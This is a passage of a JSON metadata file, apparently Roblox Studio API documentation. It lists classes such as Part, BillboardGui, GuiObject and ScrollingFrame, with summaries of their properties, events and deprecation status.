creatable","ExplorerOrder":-1,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"Color","Summary":"Color3 of the part.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CFrame","Summary":"Contains information regarding the Part's position and a matrix that defines the Part's rotation.  Can read/write. <a href=\"http://wiki.roblox.com/index.php/Cframe\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CanCollide","Summary":"Determines whether physical interactions with other Parts are respected.  If true, will collide and react with physics to other Parts.  If false, other parts will pass thru instead of colliding","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Anchored","Summary":"Determines whether or not physics acts upon the Part.  If true, part stays 'Anchored' in space, not moving regardless of any collision/forces acting upon it.  If false, physics works normally on the part.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Elasticity","Summary":"A float value ranging from 0.0f to 1.0f. Sets how much the Part will rebound against another. a value of 1 is like a superball, and 0 is like a lead block.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Friction","Summary":"A float value ranging from 0.0f to 1.0f. Sets how much the Part will be able to slide. a value of 1 is no sliding, and 0 is no friction, so infinite sliding.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Locked","Summary":"Determines whether building tools (in-game and studio) can manipulate this Part.  If true, no editing allowed.  If false, editing is allowed.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Material","Summary":"Specifies the look and feel the Part should have.  Note: this does not define the color the Part is, see BrickColor for that. <a href=\"http://wiki.roblox.com/index.php/Material\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Reflectance","Summary":"Specifies how shiny the Part is. A value of 1 is completely reflective (chrome), while a value of 0 is no reflectance (concrete wall)","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ResizeIncrement","Summary":"Sets the value for the smallest change in size allowable by the Resize(NormalId, int) function.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ResizeableFaces","Summary":"Sets the value for the faces allowed to be resized by the Resize(NormalId, int) function.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Transparency","Summary":"Sets how visible an object is. A value of 1 makes the object invisible, while a value of 0 makes the object opaque.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Velocity","Summary":"How fast the Part is traveling in studs/second. This property is NOT recommended to be modified directly, unless there is good reason.  Otherwise, try using a BodyForce to move a Part.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PositionLocal","Summary":"Position relative to parent part, or global space if there is no parent.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"OrientationLocal","Summary":"Orientation relative to parent part, or global space if there is no parent.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Orientation","Summary":"Rotation around X, Y, and Z axis.  Rotations applied in YXZ order.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Rotation","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CenterOfMass","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"makeJoints","Summary":"Use MakeJoints() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"MakeJoints","Summary":"Creates the appropriate SurfaceJoints with all parts that are touching this Instance (including internal joints in the Instance, as in a Model).  This uses the SurfaceTypes defined on the surfaces of parts to create the appropriate welds. <a href=\"http://wiki.roblox.com/index.php/MakeJoints\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BreakJoints","Summary":"Destroys SurfaceJoints with all parts that are touching this Instance (including internal joints in the Instance, as in a Model).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetMass","Summary":"Returns a number that is the mass of this Instance.  Mass of a Part is immutable, and is changed only by the size of the Part.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Resize","Summary":"Resizes a Part in the direction of the face defined by 'NormalId', by the amount specified by 'deltaAmount'. If the operation will expand the part to intersect another Instance, the part will not resize at all.  Return true if the call is successful, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"getMass","Summary":"Use GetMass() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"OutfitChanged","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LocalSimulationTouched","Summary":"Deprecated. Use Touched instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"StoppedTouching","Summary":"Deprecated. Use TouchEnded instead","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchEnded","Summary":"Fired when the part stops touching another part","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Part","Summary":"A plastic building block - the fundamental component of ROBLOX","ExplorerOrder":11,"ExplorerImageIndex":1,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TrussPart","Summary":"An extendable building truss","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WedgePart","Summary":"A Wedge Part","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PrismPart","Summary":"A Prism Part","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":"false","Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"PyramidPart","Summary":"A Pyramid Part","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":"false","Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"ParallelRampPart","Summary":"A ParallelRamp Part","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":"false","Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"RightAngleRampPart","Summary":"A RightAngleRamp Part","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":"false","Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"CornerWedgePart","Summary":"A CornerWedge Part","ExplorerOrder":12,"ExplorerImageIndex":1,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PlayerGui","Summary":"A container instance that syncs data between a single player and the server.  ScreenGui objects that are placed in this container will be shown to the Player parent only","ExplorerOrder":13,"ExplorerImageIndex":46,"Browsable":true,"PreferredParent":"","Members":[{"Name":"SelectionImageObject","Summary":"Overrides the default selection adornment (used for gamepads). For best results, this should point to a GuiObject.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PlayerScripts","Summary":"A container instance that contains LocalScripts.  LocalScript objects that are placed in this container will be exectue only when a Player is the parent.","ExplorerOrder":13,"ExplorerImageIndex":78,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StarterPlayerScripts","Summary":"A container instance that contains LocalScripts.  LocalScript objects that are placed in this container will be copied to new Players on startup.","ExplorerOrder":13,"ExplorerImageIndex":78,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StarterCharacterScripts","Summary":"A container instance that contains LocalScripts.  LocalScript objects that are placed in this container will be copied to new characters on startup.","ExplorerOrder":13,"ExplorerImageIndex":78,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GuiMain","Summary":"Deprecated, please use ScreenGui","ExplorerOrder":14,"ExplorerImageIndex":47,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"LayerCollector","Summary":"The base class of ScreenGui, BillboardGui, and SurfaceGui.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScreenGui","Summary":"The core GUI object on which tools are built.  Add Frames/Labels/Buttons to this object to have them rendered as a 2D overlay","ExplorerOrder":14,"ExplorerImageIndex":47,"Browsable":true,"PreferredParent":"StarterGui","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FunctionalTest","Summary":"Deprecated. Use TestService instead","ExplorerOrder":1,"ExplorerImageIndex":0,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"BillboardGui","Summary":"A GUI that adorns an object in the 3D world.  Add Frames/Labels/Buttons to this object to have them rendered while attached to a 3D object","ExplorerOrder":14,"ExplorerImageIndex":64,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"Adornee","Summary":"The Object the billboard gui uses as its base to render from.  Currently, the only way to set this property is thru a script, and must exist in the workspace.  This will only render if the object assigned derives from BasePart.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AbsolutePosition","Summary":"A read-only Vector2 value that is the GuiObject's current position (x,y) in pixel space, from the top left corner of the GuiObject.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AbsoluteSize","Summary":"A read-only Vector2 value that is the GuiObject's current size (width, height) in pixel space.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Active","Summary":"If true, this GuiObject can fire mouse events and will pass them to any GuiObjects layered underneath, while false will do neither.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AlwaysOnTop","Summary":"If true, billboard gui does not get occluded by 3D objects, but always renders on the screen.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Enabled","Summary":"If true, billboard gui will render, otherwise rendering will be skipped.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ExtentsOffset","Summary":"A Vector3 (x,y,z) defined in studs that will offset the gui from the extents of the 3d object it is rendering from.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PlayerToHideFrom","Summary":"Specifies a Player that the BillboardGui will not render to.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StudsOffset","Summary":"A Vector3 (x,y,z) defined in studs that will offset the gui from the centroid of the 3d object it is rendering from","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SizeOffset","Summary":"A Vector2 (x,y) defined in studs that will offset the gui size from it's current size.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Size","Summary":"A UDim2 value describing the size of the BillboardGui. More information on UDim2 is available <a href=\"http://wiki.roblox.com/index.php/UDim2\" target=\"_blank\">here</a>. Relative values are defined as one-to-one with studs.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LightInfluence","Summary":"Specifies the amount of influence lighting has on the billboard gui. A value of 0 is unlit, 1 is fully lit. Fractional values blend from unlit to lit.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SurfaceGui","Summary":"Renders its contained GuiObjects flat against the face of a part.","ExplorerOrder":14,"ExplorerImageIndex":64,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"Adornee","Summary":"The Object the surface gui uses as its base to render from.  Currently, the only way to set this property is thru a script, and must exist in the workspace.  This will only render if the object assigned derives from BasePart.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Active","Summary":"If true, this GuiObject can fire mouse events and will pass them to any GuiObjects layered underneath, while false will do neither.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Enabled","Summary":"If true, surface gui will render, otherwise rendering will be skipped.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LightInfluence","Summary":"Specifies the amount of influence lighting has on the surface gui. A value of 0 is unlit, 1 is fully lit. Fractional values blend from unlit to lit.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GuiBase2d","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"AbsolutePosition","Summary":"A read-only Vector2 value that is the GuiObject's current position (x,y) in pixel space, from the top left corner of the GuiObject.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AbsoluteSize","Summary":"A read-only Vector2 value that is the GuiObject's current size (width, height) in pixel space.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputObject","Summary":"An object that describes a particular user input, such as mouse movement, touches, keyboard, and more.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"UserInputType","Summary":"An enum that describes what kind of input this object is describing (mousebutton, touch, etc.).  See Enum.UserInputType for more info.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UserInputState","Summary":"An enum that describes what state of a particular input (touch began, touch moved, touch ended, etc.). See Enum.UserInputState for more info.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Position","Summary":"A Vector3 value that describes a positional value of this input. For mouse and touch input, this is the screen position of the mouse/touch, described in the x and y components. For mouse wheel input, the z component describes whether the wheel was moved forward or backward.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"KeyCode","Summary":"An enum that describes what kind of input is being pressed. For types of input like Keyboard, this describes what key was pressed. For input like mousebutton, this provides no additional information.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GuiObject","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"TweenPosition","Summary":"Smoothly moves a GuiObject from its current position to 'endPosition'. The only required argument is 'endPosition'. <a href=\"http://wiki.roblox.com/index.php/TweenPosition\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TweenSize","Summary":"Smoothly translates a GuiObject's current size to 'endSize'. The only required argument is 'endSize'. <a href=\"http://wiki.roblox.com/index.php/TweenSize\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TweenSizeAndPosition","Summary":"Smoothly translates a GuiObject's current size to 'endSize', and also smoothly translates the GuiObject's current position to 'endPosition'. The only required arguments are 'endSize' and 'endPosition'. <a href=\"http://wiki.roblox.com/index.php/TweenSizeAndPosition\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Active","Summary":"If true, this GuiObject can fire mouse events and will pass them to any GuiObjects layered underneath, while false will do neither.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BackgroundColor3","Summary":"A Color3 value that specifies the background color for the GuiObject. This value is ignored if the Style property (not found on all GuiObjects) is set to something besides custom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BackgroundTransparency","Summary":"A number value that specifies how transparent the background of the GuiObject is. This value is ignored if the Style property (not found on all GuiObjects) is set to something besides custom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BorderColor3","Summary":"A Color3 value that specifies the color of the outline of the GuiObject. This value is ignored if the Style property (not found on all GuiObjects) is set to something besides custom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BorderSizePixel","Summary":"A number value that specifies the thickness (in pixels) of the outline of the GuiObject. Currently this value can only be set to either 0 or 1, any other number has no effect. This value is ignored if the Style property (not found on all GuiObjects) is set to something besides custom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ClipsDescendants","Summary":"If set to true, any descendants of this GuiObject will only render if contained within it's borders. If set to false, all descendants will render regardless of position.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Draggable","Summary":"If true, allows a GuiObject to be dragged by the user's mouse. The events 'DragBegin' and 'DragStopped' are fired when the appropriate action happens, and only will fire on Draggable=true GuiObjects.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Size","Summary":"A UDim2 value describing the size of the GuiObject on screen in both absolute and relative coordinates. More information on UDim2 is available <a href=\"http://wiki.roblox.com/index.php/UDim2\" target=\"_blank\">here</a>.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Position","Summary":"A UDim2 value describing the position of the top-left corner of the GuiObject on screen. More information on UDim2 is available <a href=\"http://wiki.roblox.com/index.php/UDim2\" target=\"_blank\">here</a>.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SizeConstraint","Summary":"The direction(s) that an object can be resized in. <a href=\"http://wiki.roblox.com/index.php/SizeConstraint\" target=\"_blank\">More info</a>.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ZIndex","Summary":"Describes the ordering in which overlapping GuiObjects will be drawn. A value of 1 is drawn first, while higher values are drawn in ascending order (each value draws over the last).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BackgroundColor","Summary":"Deprecated. Use BackgroundColor3 instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"BorderColor","Summary":"Deprecated. Use BorderColor3 instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SelectionImageObject","Summary":"Overrides the default selection adornment (used for gamepads). For best results, this should point to a GuiObject.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DragBegin","Summary":"Fired when a GuiObject with Draggable set to true starts to be dragged. 'InitialPosition' is a UDim2 value of the position of the GuiObject before any drag operation began.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DragStopped","Summary":"Always fired after a DragBegin event, DragStopped is fired when the user releases the mouse button causing a drag operation on the GuiObject. Arguments 'x', and 'y' specify the top-left absolute position of the GuiObject when the event is fired.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseEnter","Summary":"Fired when the mouse enters a GuiObject, as long as the GuiObject is active (see active property for more detail). Arguments 'x', and 'y' specify the absolute pixel position of the mouse.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseLeave","Summary":"Fired when the mouse leaves a GuiObject, as long as the GuiObject is active (see active property for more detail). Arguments 'x', and 'y' specify the absolute pixel position of the mouse.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseMoved","Summary":"Fired when the mouse is inside a GuiObject and moves, as long as the GuiObject is active (see active property for more detail). Arguments 'x', and 'y' specify the absolute pixel position of the mouse.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchTap","Summary":"Fired when a user taps their finger on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the tap gesture. This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchPinch","Summary":"Fired when a user pinches their fingers on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the pinch gesture. 'scale' is a float that indicates the difference from the beginning of the pinch gesture. 'velocity' is a float indicating how quickly the pinch gesture is happening. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchSwipe","Summary":"Fired when a user swipes their fingers on a TouchEnabled device. 'swipeDirection' is an Enum.SwipeDirection, indicating the direction the user swiped. 'numberOfTouches' is an int that indicates how many touches were involved with the gesture.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchLongPress","Summary":"Fired when a user holds at least one finger for a short amount of time on the same screen position on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the gesture. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchRotate","Summary":"Fired when a user rotates two fingers on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the gesture. 'rotation' is a float indicating how much the rotation has gone from the start of the gesture. 'velocity' is a float that indicates how quickly the gesture is being performed. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchPan","Summary":"Fired when a user drags at least one finger on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the gesture. 'totalTranslation' is a Vector2, indicating how far the pan gesture has gone from its starting point. 'velocity' is a Vector2 that indicates how quickly the gesture is being performed in each dimension. 'state' indicates the Enum.UserInputState of the gesture.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputBegan","Summary":"Fired when a user begins interacting via a Human-Computer Interface device (Mouse button down, touch begin, keyboard button down, etc.). 'inputObject' is an InputObject, which contains useful data for querying user input.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputChanged","Summary":"Fired when a user changes interacting via a Human-Computer Interface device (Mouse move, touch move, mouse wheel, etc.). 'inputObject' is an InputObject, which contains useful data for querying user input.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputEnded","Summary":"Fired when a user stops interacting via a Human-Computer Interface device (Mouse button up, touch end, keyboard button up, etc.). 'inputObject' is an InputObject, which contains useful data for querying user input.  This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Frame","Summary":"A container object used to layout other GUI objects","ExplorerOrder":15,"ExplorerImageIndex":48,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"Style","Summary":"Determines how a frame will look. Uses Enum.FrameStyle. <a href=\"http://wiki.roblox.com/index.php?title=API:Enum/FrameStyle\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScrollingFrame","Summary":"A container object used to layout other GUI objects, and allows for scrolling.","ExplorerOrder":15,"ExplorerImageIndex":48,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"ScrollingEnabled","Summary":"Determines whether or not scrolling is allowed on this frame. If turned off, no scroll bars will be rendered.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CanvasSize","Summary":"Determines the size of the area that is scrollable. The UDim2 is calculated using the parent gui's size, similar to the regular Size property on gui objects.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CanvasPosition","Summary":"The absolute position the scroll frame is in respect to the canvas size. The minimum this can be set to is (0,0), while the max is the absolute canvas size - AbsoluteWindowSize.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AbsoluteWindowSize","Summary":"The size in pixels of the frame, without the scrollbars.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScrollBarThickness","Summary":"How thick the scroll bar appears. This applies to both the horizontal and vertical scroll bars. Can be set to 0 for no bars render.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TopImage","Summary":"The \"Up\" image on the vertical scrollbar. Size of this is always ScrollBarThickness by ScrollBarThickness. This is also used as the \"left\" image on the horizontal scroll bar.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MidImage","Summary":"The \"Middle\" image on the vertical scrollbar. Size of this can vary in the y direction, but is always set at ScrollBarThickness in x direction. This is also used as the \"mid\" image on the horizontal scroll bar.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BottomImage","Summary":"The \"Down\" image on the vertical scrollbar. Size of this is always ScrollBarThickness by ScrollBarThickness. This is also used as the \"right\" image on the horizontal scroll bar.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ImageLabel","Summary":"A GUI object containing an Image","ExplorerOrder":18,"ExplorerImageIndex":49,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"Image","Summary":"Specifies the id of the texture to display. <a href=\"http://wiki.roblox.com/index.php?title=API:Class/ImageLabel/Image\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScaleType","Summary":"Specifies how an image should be displayed. See ScaleType for more info.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SliceCenter","Summary":"If ScaleType is set to Slice, this Rect is used to specify the central part of the image. Everything outside of this is considered to be the border.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TileSize","Summary":"If ScaleType is set to Tile, this sets the size of the tile.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TextLabel","Summary":"A GUI object containing text","ExplorerOrder":19,"ExplorerImageIndex":50,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"TextColor","Summary":"Deprecated. Use TextColor3 instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TextButton","Summary":"A GUI button containing text","ExplorerOrder":17,"ExplorerImageIndex":51,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"TextColor","Summary":"Deprecated. Use TextColor3 instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TextBox","Summary":"A text entry box","ExplorerOrder":17,"ExplorerImageIndex":51,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"TextColor","Summary":"Deprecated. Use TextColor3 instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GuiButton","Summary":"A GUI button containing an Image","ExplorerOrder":16,"ExplorerImageIndex":52,"Browsable":"false","PreferredParent":"","Members":[{"Name":"AutoButtonColor","Summary":"Determines whether a button changes color automatically when reacting to mouse events.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Modal","Summary":"Allows the mouse to be free in first person mode. If a button with this property set to true is visible, the mouse is 'free' in first person mode.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Style","Summary":"Determines how a button will look, including mouse event states. Uses Enum.ButtonStyle. <a href=\"http://wiki.roblox.com/index.php?title=API:Class/GuiButton/Style\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseButton1Click","Summary":"Fired when the mouse is over the button, and the mouse down and up events fire without the mouse leaving the button.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseButton1Down","Summary":"Fired when the mouse button is pushed down on a button.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseButton1Up","Summary":"Fired when the mouse button is released on a button.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseButton2Click","Summary":"This function currently does not work :(","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseButton2Down","Summary":"This function currently does not work :(","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseButton2Up","Summary":"This function currently does not work :(","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ImageButton","Summary":"A GUI button containing an Image","ExplorerOrder":16,"ExplorerImageIndex":52,"Browsable":true,"PreferredParent":"StarterGui","Members":[{"Name":"Image","Summary":"Specifies the asset id of the texture to display. <a href=\"http://wiki.roblox.com/index.php?title=API:Class/ImageButton/Image\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScaleType","Summary":"Specifies how an image should be displayed. See ScaleType for more info.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SliceCenter","Summary":"If ScaleType is set to Slice, this Rect is used to specify the central part of the image. Everything outside of this is considered to be the border.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TileSize","Summary":"If ScaleType is set to Tile, this sets the size of the tile.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Handles","Summary":"A 3D GUI object to represent draggable handles","ExplorerOrder":19,"ExplorerImageIndex":53,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ArcHandles","Summary":"A 3D 